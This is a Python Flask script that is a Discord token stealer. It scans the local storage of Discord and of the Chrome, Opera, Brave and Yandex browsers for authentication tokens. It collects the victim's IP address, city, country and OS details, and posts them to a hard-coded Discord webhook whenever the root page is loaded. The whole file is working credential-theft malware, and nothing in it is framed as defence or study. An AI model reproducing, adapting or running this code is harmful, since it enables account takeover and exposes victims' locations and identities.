from flask import Flask
import os
import re
import json
from urllib.request import Request, urlopen

app = Flask(__name__)

# Your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1222071436580225055/vv3ODEp3REer37NytAbJSiAbg9kgXPhNavIH4l-pLN43Xz__K-p99ylgvuN-zB8fhdTc'

# Mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def get_personal_info():
    try:
        ip_address = urlopen(Request("https://api64.ipify.org")).read().decode().strip()
        country = urlopen(Request(f"https://ipapi.co/{ip_address}/country_name")).read().decode().strip()
        city = urlopen(Request(f"https://ipapi.co/{ip_address}/city")).read().decode().strip()
        platform_info = os.popen("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"").read().strip()
        return ip_address, country, city, platform_info
    except Exception as e:
        print(f"Error fetching personal info: {e}")
        return None, None, None, None

def main():
    try:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
    except Exception as e:
        print(f"Error fetching APPDATA and LOCALAPPDATA: {e}")
        local = None
        roaming = None

    paths = {
        'Discord': roaming + '\\Discord' if roaming else None,
        'Discord Canary': roaming + '\\discordcanary' if roaming else None,
        'Discord PTB': roaming + '\\discordptb' if roaming else None,
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default' if local else None,
        'Opera': roaming + '\\Opera Software\\Opera Stable' if roaming else None,
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default' if local else None,
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default' if local else None
    }

    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if path and os.path.exists(path):
            tokens = find_tokens(path)
            if len(tokens) > 0:
                message += f'\n**{platform}**\n```\n'
                for token in tokens:
                    message += f'Token: {token}\n'
            else:
                message += f'\n**{platform}**\nNo tokens found.\n'

    ip_address, country, city, platform_info = get_personal_info()
    if ip_address:
        message += f"\n**Personal Info**\nIP Address: {ip_address}\nCountry: {country}\nCity: {city}\nPlatform Info: {platform_info}\n"

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except Exception as e:
        print(f"Error sending webhook: {e}")

@app.route('/')
def index():
    main()
    return 'Script executed successfully!'

if __name__ == '__main__':
    app.run(debug=True)
